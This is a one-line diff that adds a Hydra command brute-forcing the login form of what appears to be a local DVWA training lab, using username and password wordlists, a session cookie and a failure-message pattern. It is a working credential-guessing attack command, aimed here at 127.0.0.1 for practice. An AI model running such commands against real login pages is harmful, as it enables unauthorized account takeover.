@@ -1,0 +1,1 @@
+hydra -L ~/dio-medusa-lab/users.txt -P ~/dio-medusa-lab/passwords.txt 127.0.0.1 -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=ufq01l9pub9duj438c9c0jc1a4; security=low:F=Username and/or password incorrect."
